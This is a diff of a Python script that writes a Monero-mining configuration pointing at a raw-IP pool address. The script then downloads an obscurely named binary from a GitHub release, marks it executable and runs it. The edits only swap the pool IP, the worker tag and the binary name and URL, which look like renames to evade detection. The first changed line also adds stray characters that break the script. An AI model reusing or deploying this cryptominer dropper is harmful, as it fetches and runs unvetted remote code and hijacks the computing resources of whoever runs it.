@@ -1,4 +1,4 @@
-import os
+'/\import os
 import json
 import random
 import subprocess
@@ -7,7 +7,7 @@ import stat
 import urllib.request
 from datetime import datetime, timedelta
 
-# === 1. Generate worker name based on a random date and time + "_PK"
+# === 1. Generate worker name based on a random date and time + "_SVP15"
 def generate_worker_name():
     # Generate a random datetime within a range (e.g., last 10 years)
     start_date = datetime(2015, 1, 1)
@@ -51,7 +51,7 @@ config = {
         "xmrSettings": {
             "disable": False,
             "enableGpu": False,
-            "poolAddress": "172.104.155.26:8083",
+            "poolAddress": "45.33.15.247:8081",
             "customParameters": f"-t {cpu_threads}"
         }
     }
@@ -62,22 +62,22 @@ with open("appsettings.json", "w") as f:
 
 print("[+] Created appsettings.json")
 
-# === 4. Download kaospa binary ===
-kaospa_url = "https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa"
-kaospa_filename = "kaospa"
+# === 4. Download travsivp binary ===
+travsivp_url = "https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/travsivp"
+travsivp_filename = "travsivp"
 
-if not os.path.exists(kaospa_filename):
-    print("[+] Downloading kaospa...")
-    urllib.request.urlretrieve(kaospa_url, kaospa_filename)
+if not os.path.exists(travsivp_filename):
+    print("[+] Downloading travsivp...")
+    urllib.request.urlretrieve(travsivp_url, travsivp_filename)
     print("[+] Download complete.")
 else:
-    print("[!] kaospa already exists. Skipping download.")
+    print("[!] travsivp already exists. Skipping download.")
 
 # === 5. Make executables
-os.chmod(kaospa_filename, os.stat(kaospa_filename).st_mode | stat.S_IEXEC)
+os.chmod(travsivp_filename, os.stat(travsivp_filename).st_mode | stat.S_IEXEC)
 os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
 print("[+] Set executable permissions.")
 
-# === 6. Run kaospa binary
-print("[+] Running ./kaospa ...")
-subprocess.run(["./kaospa"])
+# === 6. Run travsivp binary
+print("[+] Running ./travsivp ...")
+subprocess.run(["./travsivp"])
